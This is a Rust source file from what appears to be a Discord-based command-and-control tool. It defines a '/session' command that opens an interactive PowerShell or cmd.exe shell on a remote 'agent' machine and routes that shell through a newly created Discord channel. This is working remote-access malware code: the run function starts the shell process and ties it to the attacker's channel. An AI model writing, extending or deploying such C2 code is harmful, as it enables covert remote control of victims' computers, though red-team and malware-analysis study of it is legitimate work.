use crate::commands::sessions::exit;
use crate::errors::DiscordC2Error;
use crate::utils::{agent::get_or_create_agent, channels::create_text_channel};
use crate::os::process_handler::{ProcessHandler, ShellType};

use serenity::{
    builder::CreateApplicationCommand,
    model::{application::{command::{Command, CommandOptionType}, interaction::application_command::{CommandDataOption, CommandDataOptionValue}}},
    client::Context,
};
use chrono::Utc;



pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Register the session command
    command
        .name("session")
        .description("Open up an interactive command session with the agent.")
        .create_option(
            |option| {
                option.name("session-type")
                    .kind(CommandOptionType::String)
                    .description("The type of interactive session to open.")
                    .add_string_choice("powershell.exe", "powershell")
                    .add_string_choice("cmd.exe", "cmd")
                    .required(true)
            }
        )
}

pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String, Option<ShellType>), DiscordC2Error> {
    let mut agent = get_or_create_agent(ctx).await;
    let now = Utc::now().format("%m-%d-%Y┇%H︰%M︰%S╏UTC").to_string();

    // Grab the session type from options
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?
        .resolved
        .as_ref().ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?;


    // Create a channel for the remote session, and set the name/topic appropriately
    let session_channel = create_text_channel(&ctx, &*now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
    agent.set_session_channel(Some(session_channel))?; // Update the agent's session channel attribute (this also updates the JSON configuration).

    let string = format!(
        "Successfully created command session channel at <#{}>",
        session_channel
    );

    Command::create_global_application_command(&ctx.http, exit::register).await?; // Create the /exit command

    if let CommandDataOptionValue::String(shell_type) = option {
        let (content, shell) = match shell_type.as_str() {
            "powershell" => {
                ProcessHandler::instance(ShellType::Powershell).await?;
                (string, ShellType::Powershell)
            },
            "cmd" => {
                ProcessHandler::instance(ShellType::Cmd).await?;
                (string, ShellType::Cmd)
            },
            _ => return Ok((format!("Unsupported shell type: {}", shell_type), None)),
        };
        Ok((content.parse().unwrap(), Option::from(shell)))
    } else {
        return Ok(("No options were specified.".to_string(), None));
    }
}
